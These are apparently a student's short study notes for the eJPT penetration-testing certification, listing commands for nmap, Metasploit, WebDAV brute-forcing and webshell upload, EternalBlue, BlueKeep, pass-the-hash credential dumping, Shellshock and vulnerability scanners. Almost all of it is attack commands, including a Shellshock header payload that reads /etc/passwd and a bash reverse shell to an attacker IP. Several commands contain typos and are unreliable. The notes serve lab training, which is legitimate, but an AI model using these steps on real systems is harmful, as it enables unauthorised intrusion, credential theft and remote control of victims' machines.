# 08hakr's Short Notes eJPT
# Vulnerability-Assessment-Course-File

# Vulnerability Assessment
## 
- nmap -sn <target-ip>/24
- msfconsole
- setg rhosts <target-ip>
- workspace -a MS3
- db_nmap -sS -sV -O <target-ip>
- search glassfish
- set payload windows/meterpreter/reverse_tcp
- back
- searchsploit "Microsoft windows SMB" | grep -e "Metasploit"
- load db_autopwn
- db_autopwn
- analyze
- vulns

## WebDAV Vulnerabilities
- Tools:
 - dabtest
 - cadaaver
- nmap -sV -sC <target-ip>
- nmap -sV -p80 --script=http-enum <target-ip>
- hydra -L /usr/share/wordlists/metasploit/common_users.txt -P common_pass.txt <target-ip> http-get /webdav/
- davtest (tool: use to check the webDav IIS vulnerability of file upload ) 
- davtest -auth bob:password_123321 -url http://<target-ip>/webdav
- cadaver http://target/webdav (tool used to exploit the this webDav Vulnerability )
- $ ls -al /usr/share/webshells
- c$ put /usr/share/webshells/asp/webshell.asp
- dir type 

# Vulnerability analysis wwindows
## EternalBlue windows 445
- nmap -sV -p445 -O <target-ip >
- search eternal blue and exploit it

## BlueKeep RDP vulnerability 3389 windows xp vista 7 2008 & r2 
- msfconsole
- search bluekeep
- use set run
- show targets
- set target 2

## WinRM Pass The Hash
- metasploit PsExec module and Crackmapexec
- badBlue module
- pgrep lsass
- load kiwi 
- lsa_dump_sam]
- hash NTLM :
- hashdump
name:SID:LMHash<same for every user>: NT hash
- search psexec
- set SMBpass NTLM
- run 
- set target commond/Native upload

- $ crackmapexec smb <target-ip> -u Administrator -H "NTHash"

## Frequently Exploited Linux Services
## Shellshock Linux 
- nmap -sV <target-ip>
- nmap --script=http-shellshock --script-args "http-shellshoock.uri=/gettime.cgi"
- capture in burp 
User-Agent: () {:;}; echo; echo; /bin/bash -c 'catt /etc/passwd'
-  -c 'bash -i>&/dev/tcp/<attacker-ip>/<port> 0>&1'

- with metasploit 
- search shellshock
- auxiliary and exploit module
- set rhosts and targeturi /gettime.cgi
- 

## Vulnerability Scanning Nessus 
- Nessus Essential free
- sudo systemctl start nessud.service

## Web App Vulnerability Scanning with WMAP
- metasploit Plugin
- load and start
- load wmap
- wmap_TAB
- wmap_sites -a 192.157.89.3
- wmap_targets -t http://192.157.89.3
- wmap_sites -l
- wmap_targets -l
- wmap_run -t
- wmap_run -e


